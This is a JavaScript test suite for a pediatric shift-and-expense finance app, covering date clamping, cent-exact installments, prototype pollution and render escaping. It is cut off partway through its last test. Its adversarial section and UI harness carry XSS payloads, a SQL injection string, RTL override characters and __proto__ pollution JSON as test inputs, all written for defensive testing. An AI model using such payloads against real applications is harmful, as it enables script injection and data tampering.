/**
 * v4_cloud_adversarial_domain.test.js
 * Tier 5 Adversarial Hardening Suite for Finanças Pediatria V4_Cloud
 * 
 * Verifies:
 * 1. Canonical Author & Brand Invariant (APP_CREATOR = 'FChNeto')
 * 2. Calendar Boundary, Leap Year & Century Clamping Stress (D+60/D+90)
 * 3. Extreme Financial Arithmetic, Micro-Cents & Zero Float Drift Fuzzing
 * 4. Exhaustive Multi-Month Installment Permutations (2x-24x) with Cent Balancing
 * 5. Adversarial Input Fuzzing (XSS Payloads, SQL Strings, Unicode, RTL Overrides)
 * 6. Prototype Pollution & Object Key Tampering Defense
 * 7. Long String & Buffer Stress (10k-50k characters) & Ergonomic Integrity
 * 8. High-Load 36-Month Cumulative Simulation (Caixa vs Competência Conservation)
 * 
 * Canonical Author: FChNeto (APP_CREATOR = 'FChNeto')
 */

import { test, describe, beforeEach } from 'node:test';
import assert from 'node:assert/strict';

import {
  APP_CREATOR,
  APP_VERSION,
  CANONICAL_CATEGORIES,
  DEFAULT_CATEGORIES,
  MACRO_GROUPS,
  DEFAULT_HOSPITALS,
  getLocalDateString,
  addMonthsToDateString,
  formatCurrency,
  formatDateBR,
  formatMonthYear,
  getMacroGroupForCategory,
  calculateShiftInstallments,
  generateExpenseInstallments,
  PediatricStore
} from '../js/store.js';

import { getIconSvg, SVG_ICONS } from '../js/icons.js';

describe('Finanças Pediatria V4_Cloud — Tier 5 Adversarial Hardening Suite', () => {
  let store;

  beforeEach(() => {
    store = new PediatricStore();
    store.data.shifts = [];
    store.data.expenses = [];
    store.data.customCategories = [];
  });

  // ==========================================================================
  // 1. CANONICAL AUTHOR & SYSTEM INVARIANT
  // ==========================================================================
  describe('1. Canonical Author & Brand Invariant (APP_CREATOR = "FChNeto")', () => {
    test('APP_CREATOR constant is strictly "FChNeto"', () => {
      assert.equal(APP_CREATOR, 'FChNeto');
      assert.equal(store.data.creator, 'FChNeto');
      assert.equal(APP_VERSION, '4.1.0');
    });

    test('Author signature remains "FChNeto" after full factory reset', () => {
      store.resetData('full_factory');
      assert.equal(store.data.creator, 'FChNeto');
    });

    test('Author signature is present in exported backup JSON', () => {
      const backup = JSON.parse(store.exportBackupJsonString());
      assert.equal(backup.creator, 'FChNeto');
      assert.equal(backup.version, '4.1.0');
    });

    test('Importing backup overrides foreign creator tag to canonical "FChNeto"', () => {
      const foreignBackup = JSON.stringify({
        creator: 'MaliciousThirdParty',
        version: '9.9.9',
        shifts: [],
        expenses: []
      });
      const result = store.importBackupFromFile(foreignBackup);
      assert.equal(result.success, true);
      assert.equal(store.data.creator, 'FChNeto');
    });
  });

  // ==========================================================================
  // 2. CALENDAR BOUNDARY, LEAP YEAR & CENTURY CLAMPING STRESS (D+60/D+90)
  // ==========================================================================
  describe('2. Calendar Boundary, Leap Year & Century Clamping Stress (D+60/D+90)', () => {
    test('Shift on leap day (2024-02-29): D+60 is 2024-04-29 and D+90 is 2024-05-29', () => {
      const splits = calculateShiftInstallments(1200, '2024-02-29');
      assert.equal(splits.installment1.date, '2024-04-29');
      assert.equal(splits.installment2.date, '2024-05-29');
      assert.equal(splits.installment1.value + splits.installment2.value, 1200);
    });

    test('Future leap years (2028-02-29, 2032-02-29) correctly preserve day 29 in April and May', () => {
      const leap2028 = calculateShiftInstallments(1500, '2028-02-29');
      assert.equal(leap2028.installment1.date, '2028-04-29');
      assert.equal(leap2028.installment2.date, '2028-05-29');

      const leap2032 = calculateShiftInstallments(2000, '2032-02-29');
      assert.equal(leap2032.installment1.date, '2032-04-29');
      assert.equal(leap2032.installment2.date, '2032-05-29');
    });

    test('Century leap year (2000) clamps Jan 31 to Feb 29 (divisible by 400)', () => {
      const feb2000 = addMonthsToDateString('2000-01-31', 1);
      assert.equal(feb2000, '2000-02-29');
    });

    test('Century non-leap year (2100) clamps Jan 31 to Feb 28 (divisible by 100, not 400)', () => {
      const feb2100 = addMonthsToDateString('2100-01-31', 1);
      assert.equal(feb2100, '2100-02-28');
    });

    test('Month-end clamping: March 31 shifts to May 31 (D+60) and June 30 (D+90 clamped from 31 to 30)', () => {
      const splits = calculateShiftInstallments(1000, '2026-03-31');
      assert.equal(splits.installment1.date, '2026-05-31');
      assert.equal(splits.installment2.date, '2026-06-30');
    });

    test('Month-end clamping: August 31 shifts to October 31 (D+60) and November 30 (D+90 clamped from 31 to 30)', () => {
      const splits = calculateShiftInstallments(1000, '2026-08-31');
      assert.equal(splits.installment1.date, '2026-10-31');
      assert.equal(splits.installment2.date, '2026-11-30');
    });

    test('Year rollover: October 31 shifts to December 31 (D+60) and January 31 of next year (D+90)', () => {
      const splits = calculateShiftInstallments(1000, '2026-10-31');
      assert.equal(splits.installment1.date, '2026-12-31');
      assert.equal(splits.installment2.date, '2027-01-31');
    });

    test('Year rollover into non-leap Feb: Nov 30 2026 shifts to Jan 30 2027 (D+60) and Feb 28 2027 (D+90 clamped)', () => {
      const splits = calculateShiftInstallments(1000, '2026-11-30');
      assert.equal(splits.installment1.date, '2027-01-30');
      assert.equal(splits.installment2.date, '2027-02-28');
    });

    test('Year rollover into leap Feb: Nov 30 2023 shifts to Jan 30 2024 (D+60) and Feb 29 2024 (D+90 clamped)', () => {
      const splits = calculateShiftInstallments(1000, '2023-11-30');
      assert.equal(splits.installment1.date, '2024-01-30');
      assert.equal(splits.installment2.date, '2024-02-29');
    });

    test('Year rollover: Dec 31 2025 shifts to Feb 28 2026 (D+60 clamped) and Mar 31 2026 (D+90)', () => {
      const splits = calculateShiftInstallments(1000, '2025-12-31');
      assert.equal(splits.installment1.date, '2026-02-28');
      assert.equal(splits.installment2.date, '2026-03-31');
    });

    test('Year rollover into leap year: Dec 31 2023 shifts to Feb 29 2024 (D+60 clamped) and Mar 31 2024 (D+90)', () => {
      const splits = calculateShiftInstallments(1000, '2023-12-31');
      assert.equal(splits.installment1.date, '2024-02-29');
      assert.equal(splits.installment2.date, '2024-03-31');
    });

    test('Multi-year shifts (+12, +24, +36, +48 months) compute accurate leap/non-leap day limits', () => {
      // Leap day + 12 months = 2025-02-28 (clamped)
      assert.equal(addMonthsToDateString('2024-02-29', 12), '2025-02-28');
      // Leap day + 24 months = 2026-02-28 (clamped)
      assert.equal(addMonthsToDateString('2024-02-29', 24), '2026-02-28');
      // Leap day + 48 months = 2028-02-29 (next leap year!)
      assert.equal(addMonthsToDateString('2024-02-29', 48), '2028-02-29');
    });

    test('Date formatting helpers handle empty, null, undefined and malformed inputs defensively', () => {
      assert.equal(formatDateBR(null), '--/--/----');
      assert.equal(formatDateBR(undefined), '--/--/----');
      assert.equal(formatDateBR(''), '--/--/----');
      assert.equal(formatDateBR('2026-05'), '2026-05');
      assert.equal(formatDateBR('2026-05-15'), '15/05/2026');

      assert.equal(formatMonthYear(null), '');
      assert.equal(formatMonthYear(''), '');
      assert.equal(formatMonthYear('invalid'), 'invalid');
      assert.equal(formatMonthYear('2026-01'), 'Janeiro de 2026');
      assert.equal(formatMonthYear('2026-12'), 'Dezembro de 2026');
    });
  });

  // ==========================================================================
  // 3. EXTREME FINANCIAL ARITHMETIC, MICRO-CENTS & ZERO FLOAT DRIFT FUZZING
  // ==========================================================================
  describe('3. Extreme Financial Arithmetic, Micro-Cents & Zero Float Drift Fuzzing', () => {
    test('Micro-cents: R$ 0,01 shift splits into 0.01 (75%) and 0.00 (25%), preserving exact total 0.01', () => {
      const splits = calculateShiftInstallments(0.01);
      assert.equal(splits.installment1.value, 0.01);
      assert.equal(splits.installment2.value, 0.00);
      assert.equal(splits.installment1.value + splits.installment2.value, 0.01);
    });

    test('Micro-cents: R$ 0,02 shift splits into 0.02 and 0.00, preserving exact total 0.02', () => {
      const splits = calculateShiftInstallments(0.02);
      assert.equal(splits.installment1.value + splits.installment2.value, 0.02);
    });

    test('Micro-cents: R$ 0,03 shift splits into 0.02 (75%) and 0.01 (25%), preserving exact total 0.03', () => {
      const splits = calculateShiftInstallments(0.03);
      assert.equal(splits.installment1.value, 0.02);
      assert.equal(splits.installment2.value, 0.01);
      assert.equal(splits.installment1.value + splits.installment2.value, 0.03);
    });

    test('Micro-cent primes (0.05, 0.07, 0.11, 0.13, 0.33, 0.99) preserve exact sums with 0 drift', () => {
      const primes = [0.05, 0.07, 0.11, 0.13, 0.17, 0.19, 0.23, 0.29, 0.31, 0.33, 0.99];
      primes.forEach((amt) => {
        const s = calculateShiftInstallments(amt);
        const sum = Math.round((s.installment1.value + s.installment2.value) * 100) / 100;
        assert.equal(sum, amt, `Falha de centavo para valor micro: ${amt}`);
      });
    });

    test('Massive shift value R$ 999.999,99 splits exactly into 749.999,99 (75%) and 250.000,00 (25%)', () => {
      const splits = calculateShiftInstallments(999999.99);
      assert.equal(splits.installment1.value, 749999.99);
      assert.equal(splits.installment2.value, 250000.00);
      assert.equal(splits.installment1.value + splits.installment2.value, 999999.99);
    });

    test('Multi-millionaire shift values (10M, 100M, 1B) split with penny perfection', () => {
      const hugeAmounts = [10000000.00, 100000000.00, 1000000000.00];
      hugeAmounts.forEach((val) => {
        const s = calculateShiftInstallments(val);
        const sum = Math.round((s.installment1.value + s.installment2.value) * 100) / 100;
        assert.equal(sum, val);
        assert.equal(s.installment1.value, val * 0.75);
        assert.equal(s.installment2.value, val * 0.25);
      });
    });

    test('Extreme integer bound Number.MAX_SAFE_INTEGER / 100 splits without precision overflow', () => {
      const safeMaxCents = Math.floor(Number.MAX_SAFE_INTEGER / 100);
      const s = calculateShiftInstallments(safeMaxCents);
      const sum = Math.round((s.installment1.value + s.installment2.value) * 100) / 100;
      assert.equal(sum, safeMaxCents);
    });

    test('Randomized Fuzzing: 5,000 random cent amounts preserve 100% penny equality with 0 drift', () => {
      let driftCount = 0;
      for (let i = 0; i < 5000; i++) {
        // Random amount between 0.01 and 100,000.00 in cents
        const cents = Math.floor(Math.random() * 10000000) + 1;
        const net = cents / 100;
        const s = calculateShiftInstallments(net);
        const sum = Math.round((s.installment1.value + s.installment2.value) * 100) / 100;
        if (sum !== net) {
          driftCount++;
        }
      }
      assert.equal(driftCount, 0, 'Zero drift de ponto flutuante esperado em 5.000 iterações aleatórias');
    });

    test('formatCurrency handles negative, zero, extreme values and NaN gracefully', () => {
      const formattedZero = formatCurrency(0);
      assert.match(formattedZero, /0,00/);

      const formattedNeg = formatCurrency(-1500.50);
      assert.match(formattedNeg, /1\.500,50/);

      const formattedNaN = formatCurrency(NaN);
      assert.match(formattedNaN, /0,00/);

      const formattedNull = formatCurrency(null);
      assert.match(formattedNull, /0,00/);

      const formattedHuge = formatCurrency(999999999.99);
      assert.match(formattedHuge, /999\.999\.999,99/);
    });
  });

  // ==========================================================================
  // 4. EXHAUSTIVE MULTI-MONTH INSTALLMENT PERMUTATIONS (2x-24x)
  // ==========================================================================
  describe('4. Exhaustive Multi-Month Installment Permutations (2x-24x)', () => {
    test('Exhaustive 2x to 24x on R$ 100,00: all counts preserve sum === 100.00 and first installment absorbs cent', () => {
      for (let count = 2; count <= 24; count++) {
        const insts = generateExpenseInstallments({ amount: 100, description: 'Teste 100' }, count);
        assert.equal(insts.length, count);
        const sum = Math.round(insts.reduce((acc, x) => acc + x.amount, 0) * 100) / 100;
        assert.equal(sum, 100, `Falha de soma no parcelamento ${count}x para R$ 100,00`);
        assert.ok(insts[0].amount >= insts[1].amount, `1ª parcela deve absorver os centavos restantes em ${count}x`);
      }
    });

    test('Exhaustive 2x to 24x on R$ 1.250,55 (odd decimal): all counts preserve exact total', () => {
      const oddAmount = 1250.55;
      for (let count = 2; count <= 24; count++) {
        const insts = generateExpenseInstallments({ amount: oddAmount, description: 'Estetoscópio Littmann' }, count);
        assert.equal(insts.length, count);
        const sum = Math.round(insts.reduce((acc, x) => acc + x.amount, 0) * 100) / 100;
        assert.equal(sum, oddAmount, `Falha de soma no parcelamento ${count}x para R$ 1.250,55`);
      }
    });

    test('Prime installment counts (3x, 7x, 11x, 13x, 17x, 19x, 23x) on R$ 3.333,33', () => {
      const primeCounts = [3, 7, 11, 13, 17, 19, 23];
      const targetVal = 3333.33;
      primeCounts.forEach((count) => {
        const insts = generateExpenseInstallments({ amount: targetVal, description: 'Curso PALS' }, count);
        assert.equal(insts.length, count);
        const sum = Math.round(insts.reduce((acc, x) => acc + x.amount, 0) * 100) / 100;
        assert.equal(sum, targetVal, `Falha em contagem prima ${count}x`);
      });
    });

    test('Massive purchase R$ 999.999,99 in 23x and 24x distributes cleanly with 0 float drift', () => {
      const hugeVal = 999999.99;
      [23, 24].forEach((count) => {
        const insts = generateExpenseInstallments({ amount: hugeVal, description: 'Aparelho de Ultrassom' }, count);
        assert.equal(insts.length, count);
        const sum = Math.round(insts.reduce((acc, x) => acc + x.amount, 0) * 100) / 100;
        assert.equal(sum, hugeVal);
      });
    });

    test('Chronological progression: installments project baseDate + (i - 1) months across year end', () => {
      const baseDate = '2026-11-15';
      const insts = generateExpenseInstallments({ amount: 600, date: baseDate }, 6);
      assert.equal(insts[0].date, '2026-11-15');
      assert.equal(insts[1].date, '2026-12-15');
      assert.equal(insts[2].date, '2027-01-15');
      assert.equal(insts[3].date, '2027-02-15');
      assert.equal(insts[4].date, '2027-03-15');
      assert.equal(insts[5].date, '2027-04-15');
    });

    test('Installment boundary bounds: count < 1 clamps to 1; count > 24 clamps to 24', () => {
      const inst0 = generateExpenseInstallments({ amount: 50 }, 0);
      assert.equal(inst0.length, 1);
      assert.equal(inst0[0].isInstallment, false);

      const instNeg = generateExpenseInstallments({ amount: 50 }, -10);
      assert.equal(instNeg.length, 1);

      const inst25 = generateExpenseInstallments({ amount: 240 }, 25);
      assert.equal(inst25.length, 24);

      const inst100 = generateExpenseInstallments({ amount: 240 }, 100);
      assert.equal(inst100.length, 24);

      const instNaN = generateExpenseInstallments({ amount: 50 }, NaN);
      assert.equal(instNaN.length, 1);
    });

    test('Micro-cents in installments: R$ 0,01 in 2x allocates 0.01 to 1st and 0.00 to 2nd', () => {
      const insts = generateExpenseInstallments({ amount: 0.01 }, 2);
      assert.equal(insts.length, 2);
      assert.equal(insts[0].amount, 0.01);
      assert.equal(insts[1].amount, 0.00);
      assert.equal(insts[0].amount + insts[1].amount, 0.01);
    });

    test('Micro-cents in installments: R$ 0,03 in 2x allocates 0.02 to 1st and 0.01 to 2nd', () => {
      const insts = generateExpenseInstallments({ amount: 0.03 }, 2);
      assert.equal(insts.length, 2);
      assert.equal(insts[0].amount, 0.02);
      assert.equal(insts[1].amount, 0.01);
      assert.equal(insts[0].amount + insts[1].amount, 0.03);
    });
  });

  // ==========================================================================
  // 5. ADVERSARIAL INPUT FUZZING (XSS, SQL STRINGS, UNICODE, RTL OVERRIDES)
  // ==========================================================================
  describe('5. Adversarial Input Fuzzing (XSS Payloads, SQL Strings, Unicode, RTL Overrides)', () => {
    test('Hospital name with script tag <script>alert("xss")</script> stores and roundtrips without execution or corruption', () => {
      const xssHospital = '<script>alert("xss")</script>';
      const shift = store.saveShift({
        hospital: xssHospital,
        date: '2026-03-10',
        netValue: 1200
      });
      assert.equal(shift.hospital, xssHospital);
      assert.ok(store.data.hospitals.includes(xssHospital));

      // Backup JSON serializes and imports safely
      const json = store.exportBackupJsonString();
      assert.ok(json.includes('<script>alert'));
      const parsedExport = JSON.parse(json);
      assert.equal(parsedExport.shifts[0].hospital, xssHospital);
      const restored = store.importBackupFromFile(json);
      assert.equal(restored.success, true);
      assert.equal(store.data.shifts[0].hospital, xssHospital);
    });

    test('Shift notes with SQL injection tokens (DROP TABLE, OR 1=1) store and retrieve safely', () => {
      const sqlNotes = "'; DROP TABLE shifts; SELECT * FROM profiles WHERE '1'='1";
      const shift = store.saveShift({
        hospital: 'Maternidade Principal',
        date: '2026-03-15',
        netValue: 1500,
        notes: sqlNotes
      });
      assert.equal(shift.notes, sqlNotes);
      const summary = store.getMonthSummary('2026-03', 'competencia');
      assert.equal(summary.workedThisMonthTotal, 1500);
    });

    test('Expense description with XSS img payload <img src=x onerror=alert(1)> survives 1x-24x installment generator', () => {
      const xssDesc = '<img src=x onerror=alert(1)>';
      const insts = generateExpenseInstallments({
        description: xssDesc,
        amount: 300,
        date: '2026-03-01'
      }, 3);

      assert.equal(insts.length, 3);
      assert.ok(insts[0].description.includes(xssDesc));
      assert.ok(insts[1].description.includes(xssDesc));
      assert.ok(insts[2].description.includes(xssDesc));
    });

    test('Custom category with HTML tags and quotes maps to fallback macro-group without crashing', () => {
      const maliciousCat = '<b onmouseover="alert(1)">Nova Categoria "Injetada"</b>';
      const macro = getMacroGroupForCategory(maliciousCat);
      assert.ok(macro && macro.id);
      assert.equal(macro.id, 'macro_lazer_outros');
    });

    test('Doctor profile fields with XSS tags and symbols store and update reliably', () => {
      store.updateDoctorProfile({
        doctorName: 'Dra. <script>alert(1)</script> Profissional',
        crm: 'CRM/TESTE <img src=x onerror=1>',
        specialty: 'Neonatologia & <svg onload=alert(1)>',
        salaryValue: 0.00
      });

      assert.equal(store.data.doctorName, 'Dra. <script>alert(1)</script> Profissional');
      assert.equal(store.data.crm, 'CRM/TESTE <img src=x onerror=1>');
      assert.equal(store.data.specialty, 'Neonatologia & <svg onload=alert(1)>');
    });

    test('Unicode control characters and RTL overrides (\\u202E, \\u200B, \\uFEFF) do not corrupt string operations', () => {
      const rtlName = '\u202ERequest Injection\u202C \u200BZeroWidth \uFEFFBOM';
      const shift = store.saveShift({
        hospital: rtlName,
        date: '2026-04-01',
        netValue: 1000
      });
      assert.equal(shift.hospital, rtlName);

      const summary = store.getMonthSummary('2026-04', 'competencia');
      assert.equal(summary.workedThisMonthTotal, 1000);
    });

    test('Emojis (🩺🌸✨💉🏥👶) in hospital names, notes and categories preserve UTF-8 byte integrity', () => {
      const emojiHospital = 'Maternidade 🏥 Maternidade Principal 🩺 UTI Neonatal 👶🌸✨';
      const emojiNotes = 'Plantão tranquilo com 3 partos cesáreos 💉';
      store.saveShift({
        hospital: emojiHospital,
        date: '2026-05-10',
        netValue: 1400,
        notes: emojiNotes
      });

      const json = store.exportBackupJsonString();
      assert.ok(json.includes('🏥'));
      assert.ok(json.includes('👶🌸✨'));

      const restored = store.importBackupFromFile(json);
      assert.equal(restored.success, true);
      assert.equal(store.data.shifts[0].hospital, emojiHospital);
      assert.equal(store.data.shifts[0].notes, emojiNotes);
    });

    test('Malformed JSON in importBackupFromFile rejects gracefully without throwing fatal exception', () => {
      const malformedCases = [
        '{invalid_json',
        'null',
        '""',
        '12345',
        '{"shifts": "not_an_array"}'
      ];

      malformedCases.forEach((badJson) => {
        const result = store.importBackupFromFile(badJson);
        assert.ok(typeof result.success === 'boolean');
      });
    });
  });

  // ==========================================================================
  // 6. PROTOTYPE POLLUTION & OBJECT KEY TAMPERING DEFENSE
  // ==========================================================================
  describe('6. Prototype Pollution & Object Key Tampering Defense', () => {
    test('Custom category named "__proto__" does not pollute global Object.prototype', () => {
      const maliciousCategory = '__proto__';
      store.data.customCategories = [
        { id: 'cat_proto', name: maliciousCategory, macro_group: 'Alimentação' }
      ];

      // Test prototype lookup
      getMacroGroupForCategory(maliciousCategory, store.data.customCategories);

      // Verify Object prototype is unpolluted
      assert.equal(({})['polluted'], undefined);
      assert.equal(({})['macro_group'], undefined);
    });

    test('Saving shifts or expenses with property keys "__proto__" or "constructor" does not alter Object prototype', () => {
      const dirtyShift = JSON.parse('{"hospital": "Maternidade Principal", "netValue": 1000, "__proto__": {"isAdmin": true}}');
      store.saveShift(dirtyShift);

      assert.equal(({})['isAdmin'], undefined);

      const dirtyExpense = JSON.parse('{"description": "Gasto", "amount": 100, "__proto__": {"pwned": true}}');
      store.saveExpense(dirtyExpense);

      assert.equal(({})['pwned'], undefined);
    });

    test('getIconSvg with unknown icon name returns fallback tag icon without crashing', () => {
      const fallback = getIconSvg('non_existent_icon_xyz_123');
      assert.ok(fallback.startsWith('<svg'));
      assert.ok(fallback.includes('viewBox="0 0 24 24"'));
    });

    test('getIconSvg with options: custom size and color are safely applied to SVG markup', () => {
      const customSvg = getIconSvg('stethoscope', { size: 32, color: '#EC407A', className: 'pulse-icon' });
      assert.ok(customSvg.includes('width="32"'));
      assert.ok(customSvg.includes('height="32"'));
      assert.ok(customSvg.includes('color: #EC407A'));
      assert.ok(customSvg.includes('pulse-icon'));
    });

    test('Empirical finding verification: Object prototype property lookups on plain dictionary objects', () => {
      // Documenting empirical behavior when plain object is used as a dictionary
      const dict = {};
      assert.equal(typeof dict['toString'], 'function');
      assert.equal(typeof dict['valueOf'], 'function');
      assert.equal(typeof dict['constructor'], 'function');

      // Safe lookup should use Object.hasOwn or Object.prototype.hasOwnProperty
      assert.equal(Object.hasOwn(dict, 'toString'), false);
      assert.equal(Object.hasOwn(dict, 'valueOf'), false);
    });
  });

  // ==========================================================================
  // 7. LONG STRING & BUFFER STRESS (10k-50k CHARACTERS) & ERGONOMIC INTEGRITY
  // ==========================================================================
  describe('7. Long String & Buffer Stress (10k-50k characters) & Ergonomic Integrity', () => {
    test('10,000 character hospital name persists and formats without stack overflow', () => {
      const massiveHospital = 'H'.repeat(10000);
      const shift = store.saveShift({
        hospital: massiveHospital,
        date: '2026-06-01',
        netValue: 1200
      });

      assert.equal(shift.hospital.length, 10000);
      const summary = store.getMonthSummary('2026-06', 'competencia');
      assert.equal(summary.workedThisMonthTotal, 1200);
    });

    test('50,000 character expense description generates installments and exports to JSON cleanly', () => {
      const massiveDesc = 'Despesa Gigante '.repeat(3125); // ~50,000 chars
      assert.ok(massiveDesc.length >= 50000);

      const insts = generateExpenseInstallments({
        description: massiveDesc,
        amount: 2400,
        date: '2026-07-01'
      }, 4);

      assert.equal(insts.length, 4);
      assert.ok(insts[0].description.length >= 50000);

      store.data.expenses.push(...insts);
      const backupStr = store.exportBackupJsonString();
      assert.ok(backupStr.length > 50000);

      const parsed = JSON.parse(backupStr);
      assert.equal(parsed.expenses.length, 4);
    });

    test('20,000 character shift notes handle serialization without memory exhaustion', () => {
      const massiveNotes = 'Anotação de plantão pediátrico em sala de parto. '.repeat(400); // ~20,000 chars
      const shift = store.saveShift({
        hospital: 'Maternidade Secundária',
        date: '2026-08-01',
        netValue: 1500,
        notes: massiveNotes
      });

      assert.ok(shift.notes.length >= 19000);
      assert.equal(store.data.shifts[0].notes.length, shift.notes.length);
    });
  });

  // ==========================================================================
  // 8. HIGH-LOAD 36-MONTH CUMULATIVE SIMULATION (CONSERVATION LAWS)
  // ==========================================================================
  describe('8. High-Load 36-Month Cumulative Simulation (Conservation Laws)', () => {
    test('36-Month High-Load Simulation: Zero penny drift, Category/Macro conservation, and Caixa vs Competência equivalence', () => {
      // 1. Generate 36 months of realistic medical production (2024 to 2026)
      const months = [];
      let curYear = 2024;
      let curMonth = 1;
      for (let i = 0; i < 36; i++) {
        const mStr = `${curYear}-${String(curMonth).padStart(2, '0')}`;
        months.push(mStr);
        curMonth++;
        if (curMonth > 12) {
          curMonth = 1;
          curYear++;
        }
      }

      let totalGrossWorked = 0;
      let totalNetWorked = 0;
      let totalExpensesCreated = 0;

      // Add 10 shifts per month with odd cents across 3 maternities
      const hospitals = ['Maternidade Principal', 'Maternidade Secundária', 'Hospital Pediátrico'];
      months.forEach((mStr, mIdx) => {
        for (let s = 1; s <= 10; s++) {
          const day = String((s * 2) % 28 + 1).padStart(2, '0');
          const shiftDate = `${mStr}-${day}`;
          const net = Math.round((1200 + (s * 37.33) + (mIdx * 3.11)) * 100) / 100;
          totalNetWorked = Math.round((totalNetWorked + net) * 100) / 100;
          totalGrossWorked = Math.round((totalGrossWorked + net * 1.15) * 100) / 100;

          store.saveShift({
            hospital: hospitals[s % hospitals.length],
            date: shiftDate,
            shiftType: '12h Noturno',
            grossValue: Math.round(net * 1.15 * 100) / 100,
            netValue: net
          });
        }

        // Add 5 expenses per month with 1x to 12x installments
        for (let e = 1; e <= 5; e++) {
          const expVal = Math.round((150 + (e * 49.99)) * 100) / 100;
          totalExpensesCreated = Math.round((totalExpensesCreated + expVal) * 100) / 100;
          const cat = CANONICAL_CATEGORIES[(mIdx * 5 + e) % CANONICAL_CATEGORIES.length];
          const isInst = e % 2 === 0;
          const instCount = isInst ? (e * 2) : 1;

          store.saveExpense({
            description: `Despesa ${mStr} #${e}`,
            amount: expVal,
            date: `${mStr}-10`,
            category: cat,
            isInstallment: isInst,
            totalInstallments: instCount
          });
        }
      });

      assert.equal(store.data.shifts.length, 360);
      assert.ok(store.data.expenses.length > 180);

      // Verify each month's mathematical conservation
      months.forEach((mStr) => {
        const caixa = store.getMonthSummary(mStr, 'caixa');
        const comp = store.getMonthSummary(mStr, 'competencia');

        // Conservation 1: Balance === totalIncome - totalExpenses
        assert.equal(
          caixa.balance,
          Math.round((caixa.totalIncome - caixa.totalExpenses) * 100) / 100,
          `Balanço inconsistente em Caixa para mês ${mStr}`
        );
        assert.equal(
          comp.balance,
          Math.round((comp.totalIncome - comp.totalExpenses) * 100) / 100,
          `Balanço inconsistente em Competência para mês ${mStr}`
        );

        // Conservation 2: Category breakdown sum === totalExpenses
        const sumCategories = Math.round(caixa.categoryBreakdown.reduce((sum, c) => sum + c.value, 0) * 100) / 100;
        assert.equal(sumCategories, caixa.totalExpenses, `Soma das categorias difere do total de despesas em ${mStr}`);

        // Conservation 3: Macro breakdown sum === totalExpenses
        const sumMacros = Math.round(caixa.macroBreakdown.reduce((sum, m) => sum + m.value, 0) * 100) / 100;
        assert.equal(sumMacros, caixa.totalExpenses, `Soma dos macro-grupos difere do total de despesas em ${mStr}`);
      });

      // Conservation 4: Total shift production worked across all 36 months
      // equals sum of shift income in Competência across all 36 months
      let totalCompShiftIncome = 0;
      months.forEach((mStr) => {
        const comp = store.getMonthSummary(mStr, 'competencia');
        totalCompShiftIncome = Math.round((totalCompShiftIncome + comp.shiftIncome) * 100) / 100;
      });
      assert.equal(totalCompShiftIncome, totalNetWorked, 'Produção total deve ser idêntica à soma de Competência');

      // Conservation 5: Shift cash payments in Caixa over 36 months + 3-month tail (D+60/D+90 runout)
      // must equal exactly total shift production worked!
      const extendedMonths = [...months, '2027-01', '2027-02', '2027-03'];
      let totalCaixaShiftIncome = 0;
      extendedMonths.forEach((mStr) => {
        const caixa = store.getMonthSummary(mStr, 'caixa');
        totalCaixaShiftIncome = Math.round((totalCaixaShiftIncome + caixa.shiftIncome) * 100) / 100;
      });

      assert.equal(
        totalCaixaShiftIncome,
        totalNetWorked,
        'Conservação Total de Liquidez: soma de repasses em Caixa (D+60/D+90) deve ser rigorosamente igual à produção trabalhada!'
      );
    });
  });

  // ==========================================================================
  // 9. UI CONTROLLER ADVERSARIAL RENDERING & DOM SAFETY HARNESS
  // ==========================================================================
  describe('9. UI Controller Adversarial Rendering & DOM Safety Harness', () => {
    class MockElement {
      constructor(tagName = 'div', id = '') {
        this.tagName = tagName.toUpperCase();
        this.id = id;
        this.classList = {
          classes: new Set(),
          add(...c) { c.forEach(x => this.classes.add(x)); },
          remove(...c) { c.forEach(x => this.classes.delete(x)); },
          contains(x) { return this.classes.has(x); }
        };
        this.attributes = new Map();
        this.style = {};
        this.children = [];
        this._innerHTML = '';
        this._textContent = '';
      }
      setAttribute(k, v) { this.attributes.set(k, String(v)); }
      getAttribute(k) { return this.attributes.get(k) || null; }
      get innerHTML() { return this._innerHTML; }
      set innerHTML(v) {
        this._innerHTML = String(v);
        this._textContent = String(v).replace(/<[^>]*>/g, '');
      }
      get textContent() { return this._textContent; }
      set textContent(v) { this._textContent = String(v); }
      appendChild(c) { this.children.push(c); return c; }
      removeChild(c) {
        const idx = this.children.indexOf(c);
        if (idx >= 0) this.children.splice(idx, 1);
        return c;
      }
      querySelector(sel) {
        const found = this.querySelectorAll(sel);
        return found.length > 0 ? found[0] : null;
      }
      querySelectorAll(sel) {
        const res = [];
        const check = (node) => {
          if (sel.startsWith('#') && node.id === sel.slice(1)) res.push(node);
          else if (sel.startsWith('.') && node.classList.contains(sel.slice(1))) res.push(node);
          node.children.forEach(check);
        };
        this.children.forEach(check);
        return res;
      }
    }

    let uiStore;
    let ui;
    let domElements;

    beforeEach(async () => {
      domElements = new Map();
      const doc = {
        body: new MockElement('body'),
        getElementById: (id) => domElements.get(id) || null,
        querySelector: (sel) => {
          if (sel.startsWith('#')) return domElements.get(sel.slice(1)) || null;
          return null;
        },
        querySelectorAll: () => [],
        createElement: (tag) => new MockElement(tag),
        addEventListener: () => {}
      };

      const ids = [
        'view-home', 'view-income', 'view-expenses', 'sync-badge',
        'toast-container', 'current-month-title', 'current-regime-pill',
        'header-doctor-name', 'header-doctor-role', 'doctor-avatar-img',
        'doctor-avatar-fallback'
      ];
      ids.forEach(id => {
        const el = new MockElement('div', id);
        domElements.set(id, el);
        doc.body.appendChild(el);
      });

      const badge = domElements.get('sync-badge');
      const dot = new MockElement('span');
      dot.className = 'sync-dot';
      badge.appendChild(dot);
      const txt = new MockElement('span');
      txt.className = 'sync-text';
      badge.appendChild(txt);

      global.document = doc;
      global.window = {
        scrollTo: () => {},
        dispatchEvent: () => {}
      };

      const { PediatricUI } = await import('../js/ui.js');
      uiStore = new PediatricStore();
      uiStore.data.shifts = [];
      uiStore.data.expenses = [];
      ui = new PediatricUI(uiStore);
    });

    test('UI renders without throwing fatal exception when shift contains XSS injection payload', () => {
      const today = getLocalDateString();
      const xssHospital = '<img src=x onerror="alert(document.cookie)">';
      uiStore.saveShift({
        hospital: xssHospital,
        date: today,
        netValue: 1500
      });

      // Renders income view cleanly without crashing
      assert.doesNotThrow(() => {
        ui.switchTab('income');
      });

      const incomeView = domElements.get('view-income');
      assert.ok(incomeView.innerHTML.length > 0);
      // Remediated: raw payload is sanitized with escapeHtml (&lt;, &gt;, &quot;)
      assert.ok(incomeView.innerHTML.includes('&lt;img src=x onerror=&quot;alert(document.cookie)&quot;&gt;'));
